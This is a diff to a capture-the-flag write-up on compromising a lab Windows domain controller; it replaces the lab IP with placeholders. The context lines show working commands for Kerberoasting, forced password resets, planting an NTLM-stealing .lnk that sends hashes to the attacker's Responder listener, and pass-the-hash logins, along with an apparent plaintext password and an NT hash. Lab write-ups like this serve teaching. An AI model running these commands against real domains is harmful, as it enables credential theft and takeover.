@@ -26,11 +26,11 @@ Leaked DB → Hash cracking → Kerberoasting (r.haggard)
 Add the following entries to `/etc/hosts`:
 
 ```
-10.1.130.199 buildingmagic.local
-10.1.130.199 dc01.buildingmagic.local
+<DC_IP> buildingmagic.local
+<DC_IP> dc01.buildingmagic.local
 ```
 
-> Replace `10.1.130.199` with the IP shown on the lab page when you spin up the machine.
+> Replace `<DC_IP>` with the IP shown on the lab page when you spin up the machine.
 
 ---
 
@@ -105,7 +105,7 @@ The filtered results are a VPN/timing artefact from running nmap without `-Pn` �
 ### User Enumeration via RID Cycling
 
 ```bash
-nxc smb 10.1.130.199 -u 'r.widdleton' -p 'REDACTED' --rid-brute
+nxc smb <DC_IP> -u 'r.widdleton' -p 'REDACTED' --rid-brute
 ```
 
 Key users discovered:
@@ -121,7 +121,7 @@ Key users discovered:
 ### BloodHound Collection
 
 ```bash
-nxc ldap dc01.buildingmagic.local -u 'r.widdleton' -p 'REDACTED' --bloodhound --collection All --dns-server 10.1.130.199
+nxc ldap dc01.buildingmagic.local -u 'r.widdleton' -p 'REDACTED' --bloodhound --collection All --dns-server <DC_IP>
 ```
 
 Ingest the `.zip` into BloodHound and run the **Kerberoastable Users** query.
@@ -141,7 +141,7 @@ Ingest the `.zip` into BloodHound and run the **Kerberoastable Users** query.
 Request the TGS ticket for `r.haggard`:
 
 ```bash
-impacket-GetUserSPNs buildingmagic.local/r.widdleton:REDACTED -dc-ip 10.1.130.199 -request-user r.haggard -outputfile kerberoast.txt
+impacket-GetUserSPNs buildingmagic.local/r.widdleton:REDACTED -dc-ip <DC_IP> -request-user r.haggard -outputfile kerberoast.txt
 ```
 
 ```
@@ -153,7 +153,7 @@ HOGWARTS-DC/r.hagrid.WIZARDING.THM:60111  r.haggard            2025-05-15 17:09:
 Alternative via NetExec:
 
 ```bash
-nxc ldap 10.1.130.199 -u 'r.widdleton' -p 'REDACTED' --kerberoasting kerberoast.txt
+nxc ldap <DC_IP> -u 'r.widdleton' -p 'REDACTED' --kerberoasting kerberoast.txt
 ```
 
 Crack offline with Hashcat (`-m 13100` = `krb5tgs` RC4-HMAC):
@@ -194,7 +194,7 @@ BloodHound shows the exact command to abuse this right:
 `r.haggard` has `ForcePasswordChange` rights over `h.potch`, allowing us to set a new password without knowing the current one:
 
 ```bash
-bloodyAD -u r.haggard -p REDACTED -d buildingmagic.local -H 10.1.130.199 set password h.potch 'NewPass123!'
+bloodyAD -u r.haggard -p REDACTED -d buildingmagic.local -H <DC_IP> set password h.potch 'NewPass123!'
 ```
 
 ```
@@ -204,7 +204,7 @@ bloodyAD -u r.haggard -p REDACTED -d buildingmagic.local -H 10.1.130.199 set pas
 **rpcclient alternative:**
 
 ```bash
-rpcclient -U 'BUILDINGMAGIC.LOCAL/r.haggard%rubeushagrid' 10.1.130.199 -c "setuserinfo2 h.potch 23 'NewPass123!'"
+rpcclient -U 'BUILDINGMAGIC.LOCAL/r.haggard%rubeushagrid' <DC_IP> -c "setuserinfo2 h.potch 23 'NewPass123!'"
 ```
 
 Check share access:
@@ -232,26 +232,26 @@ With write access to a share, we plant a malicious `.lnk` file. When any user br
 ### Step 1 — Generate malicious files
 
 ```bash
-# Find your tun0 IP first: ip addr show tun0
+# Find your <INTERFACE> IP first: ip addr show <INTERFACE>
 ntlm_theft.py --verbose --generate modern --server <YOUR_TUN0_IP> --filename "meetingXYZ"
 ```
 
 ### Step 2 — Start Responder
 
 ```bash
-sudo responder -I tun0 -wv
+sudo responder -I <INTERFACE> -wv
 ```
 
 ### Step 3 — Upload the `.lnk` to the share
 
 ```bash
-smbclient //10.1.130.199/File-Share -U 'BUILDINGMAGIC.LOCAL/h.potch%NewPass123!' -c 'put meetingXYZ/meetingXYZ.lnk meetingXYZ.lnk'
+smbclient //<DC_IP>/File-Share -U 'BUILDINGMAGIC.LOCAL/h.potch%NewPass123!' -c 'put meetingXYZ/meetingXYZ.lnk meetingXYZ.lnk'
 ```
 
 ### Step 4 — Capture and crack the hash
 
 ```
-[SMB] NTLMv2-SSP Client   : 10.1.130.199
+[SMB] NTLMv2-SSP Client   : <DC_IP>
 [SMB] NTLMv2-SSP Username : BUILDINGMAGIC\h.grangon
 [SMB] NTLMv2-SSP Hash     : h.grangon::BUILDINGMAGIC:49af3a2a34c1a4d4:...
 ```
@@ -273,7 +273,7 @@ BloodHound confirms `h.grangon` is a member of **Remote Management Users**.
 ![BloodHound — h.grangon Remote Management Users](screenshots/bloodhound-remote-management.png)
 
 ```bash
-nxc winrm 10.1.130.199 -u 'h.grangon' -p 'REDACTED'
+nxc winrm <DC_IP> -u 'h.grangon' -p 'REDACTED'
 ```
 
 ```
@@ -281,7 +281,7 @@ nxc winrm 10.1.130.199 -u 'h.grangon' -p 'REDACTED'
 ```
 
 ```bash
-evil-winrm -i 10.1.130.199 -u 'h.grangon' -p 'REDACTED'
+evil-winrm -i <DC_IP> -u 'h.grangon' -p 'REDACTED'
 ```
 
 ### User Flag
@@ -377,7 +377,7 @@ nxc smb BUILDINGMAGIC.LOCAL -u users.txt -H '520126a03f5d5a8d836f1c4f34ede7ce' -
 ## Root Flag
 
 ```bash
-evil-winrm -u 'a.flatch' -H '520126a03f5d5a8d836f1c4f34ede7ce' -i 10.1.130.199
+evil-winrm -u 'a.flatch' -H '520126a03f5d5a8d836f1c4f34ede7ce' -i <DC_IP>
 ```
 
 ```
